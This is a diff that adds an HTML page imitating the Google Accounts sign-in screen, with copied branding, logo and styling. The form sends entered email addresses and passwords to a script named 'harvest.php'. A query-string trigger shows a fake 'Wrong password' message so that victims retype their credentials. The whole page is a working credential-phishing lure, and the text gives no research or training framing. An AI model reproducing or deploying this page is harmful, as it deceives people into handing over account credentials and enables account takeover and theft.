@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in – Google Accounts</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: "Google Sans", Roboto, Arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,.15);
+            padding: 48px 48px 36px;
+            max-width: 450px;
+            width: 100%;
+        }
+        .logo { text-align: center; margin-bottom: 16px; }
+        .logo svg { height: 24px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
+        .subtitle { font-size: 16px; color: #5f6368; text-align: center; margin-bottom: 28px; }
+        .error-box {
+            background: #fce8e6;
+            border-radius: 4px;
+            padding: 10px 14px;
+            font-size: 14px;
+            color: #c5221f;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .error-box.show { display: block; }
+        .field { margin-bottom: 24px; position: relative; }
+        .field input {
+            width: 100%;
+            padding: 13px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            color: #202124;
+            transition: border-color .15s;
+        }
+        .field input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
+        .field label {
+            position: absolute;
+            top: -9px; left: 12px;
+            background: #fff;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .field input:focus + label,
+        .field label { color: #1a73e8; }
+        .actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 36px;
+        }
+        .forgot { font-size: 14px; color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .forgot:hover { text-decoration: underline; }
+        .btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            letter-spacing: .25px;
+            transition: background .2s;
+        }
+        .btn:hover { background: #1557b0; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9.24 8.19c0-.52-.06-1.02-.17-1.5H4.7v2.84h2.55a2.2 2.2 0 0 1-.95 1.44v1.2h1.53c.9-.83 1.41-2.05 1.41-3.48z" fill="#4285F4"/>
+                <path d="M4.7 13.28c1.28 0 2.35-.42 3.14-1.14l-1.53-1.19c-.43.29-.97.46-1.61.46-1.24 0-2.29-.84-2.67-1.96H.46v1.23A4.74 4.74 0 0 0 4.7 13.28z" fill="#34A853"/>
+                <path d="M2.03 9.45a2.84 2.84 0 0 1 0-1.82V6.4H.46a4.74 4.74 0 0 0 0 4.28l1.57-1.23z" fill="#FBBC05"/>
+                <path d="M4.7 5.67c.7 0 1.32.24 1.82.71l1.36-1.36A4.7 4.7 0 0 0 4.7 3.5 4.74 4.74 0 0 0 .46 6.4l1.57 1.23c.38-1.12 1.43-1.96 2.67-1.96z" fill="#EA4335"/>
+                <text x="11" y="18" font-family="Arial,sans-serif" font-size="18" font-weight="bold" fill="#4285F4">G</text>
+                <text x="20" y="18" font-family="Arial,sans-serif" font-size="18" fill="#EA4335">o</text>
+                <text x="29" y="18" font-family="Arial,sans-serif" font-size="18" fill="#FBBC05">o</text>
+                <text x="38" y="18" font-family="Arial,sans-serif" font-size="18" fill="#4285F4">g</text>
+                <text x="46" y="18" font-family="Arial,sans-serif" font-size="18" fill="#34A853">l</text>
+                <text x="52" y="18" font-family="Arial,sans-serif" font-size="18" fill="#EA4335">e</text>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+
+        <div class="error-box" id="errBox">
+            Wrong password. Try again or click "Forgot password" to reset it.
+        </div>
+
+        <form method="POST" action="harvest.php">
+            <div class="field">
+                <input type="email" name="username" id="username" required autofocus
+                       autocomplete="username" placeholder=" " />
+                <label for="username">Email or phone</label>
+            </div>
+            <div class="field">
+                <input type="password" name="password" id="password" required
+                       autocomplete="current-password" placeholder=" " />
+                <label for="password">Password</label>
+            </div>
+            <div class="actions">
+                <a href="#" class="forgot">Forgot password?</a>
+                <button type="submit" class="btn">Next</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        if (new URLSearchParams(location.search).get('error')) {
+            document.getElementById('errBox').classList.add('show');
+        }
+    </script>
+</body>
+</html>
